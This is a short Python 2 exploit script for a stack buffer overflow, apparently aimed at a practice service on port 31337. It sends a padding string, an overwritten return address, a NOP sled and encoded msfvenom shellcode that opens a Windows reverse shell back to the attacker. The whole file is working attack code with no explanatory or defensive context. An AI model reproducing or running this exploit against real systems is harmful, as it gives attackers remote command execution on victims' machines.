#!/usr/bin/env python2
import socket

#msfvenom -p windows/shell_reverse_tcp lhost=host lport=443 -b "\x00\x0a" EXITFUNC=thread -f python -a x86 --platform windows -e x86/shikata_ga_nai
buf =  b""
buf += b"\xd9\xea\xd9\x74\x24\xf4\x5d\xb8\x9e\xb2\xbc\x2c\x31"
buf += b"\xc9\xb1\x52\x83\xed\xfc\x31\x45\x13\x03\xdb\xa1\x5e"
buf += b"\xd9\x1f\x2d\x1c\x22\xdf\xae\x41\xaa\x3a\x9f\x41\xc8"
buf += b"\x4f\xb0\x71\x9a\x1d\x3d\xf9\xce\xb5\xb6\x8f\xc6\xba"
buf += b"\x7f\x25\x31\xf5\x80\x16\x01\x94\x02\x65\x56\x76\x3a"
buf += b"\xa6\xab\x77\x7b\xdb\x46\x25\xd4\x97\xf5\xd9\x51\xed"
buf += b"\xc5\x52\x29\xe3\x4d\x87\xfa\x02\x7f\x16\x70\x5d\x5f"
buf += b"\x99\x55\xd5\xd6\x81\xba\xd0\xa1\x3a\x08\xae\x33\xea"
buf += b"\x40\x4f\x9f\xd3\x6c\xa2\xe1\x14\x4a\x5d\x94\x6c\xa8"
buf += b"\xe0\xaf\xab\xd2\x3e\x25\x2f\x74\xb4\x9d\x8b\x84\x19"
buf += b"\x7b\x58\x8a\xd6\x0f\x06\x8f\xe9\xdc\x3d\xab\x62\xe3"
buf += b"\x91\x3d\x30\xc0\x35\x65\xe2\x69\x6c\xc3\x45\x95\x6e"
buf += b"\xac\x3a\x33\xe5\x41\x2e\x4e\xa4\x0d\x83\x63\x56\xce"
buf += b"\x8b\xf4\x25\xfc\x14\xaf\xa1\x4c\xdc\x69\x36\xb2\xf7"
buf += b"\xce\xa8\x4d\xf8\x2e\xe1\x89\xac\x7e\x99\x38\xcd\x14"
buf += b"\x59\xc4\x18\xba\x09\x6a\xf3\x7b\xf9\xca\xa3\x13\x13"
buf += b"\xc5\x9c\x04\x1c\x0f\xb5\xaf\xe7\xd8\x7a\x87\xe5\x73"
buf += b"\x13\xda\xe9\x82\x58\x53\x0f\xee\x8e\x32\x98\x87\x37"
buf += b"\x1f\x52\x39\xb7\xb5\x1f\x79\x33\x3a\xe0\x34\xb4\x37"
buf += b"\xf2\xa1\x34\x02\xa8\x64\x4a\xb8\xc4\xeb\xd9\x27\x14"
buf += b"\x65\xc2\xff\x43\x22\x34\xf6\x01\xde\x6f\xa0\x37\x23"
buf += b"\xe9\x8b\xf3\xf8\xca\x12\xfa\x8d\x77\x31\xec\x4b\x77"
buf += b"\x7d\x58\x04\x2e\x2b\x36\xe2\x98\x9d\xe0\xbc\x77\x74"
buf += b"\x64\x38\xb4\x47\xf2\x45\x91\x31\x1a\xf7\x4c\x04\x25"
buf += b"\x38\x19\x80\x5e\x24\xb9\x6f\xb5\xec\xd9\x8d\x1f\x19"
buf += b"\x72\x08\xca\xa0\x1f\xab\x21\xe6\x19\x28\xc3\x97\xdd"
buf += b"\x30\xa6\x92\x9a\xf6\x5b\xef\xb3\x92\x5b\x5c\xb3\xb6"

overflow = "A"*146
retorno = "\xc3\x14\x04\x08"
NOP = "\x90"*16
postfix = "\n"

buffer = overflow + retorno + NOP + buf + postfix

try:
        print "Done.".format(buffer)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("host", 31337))
        s.send(buffer)
        s.close
except:
        print ("Error!")
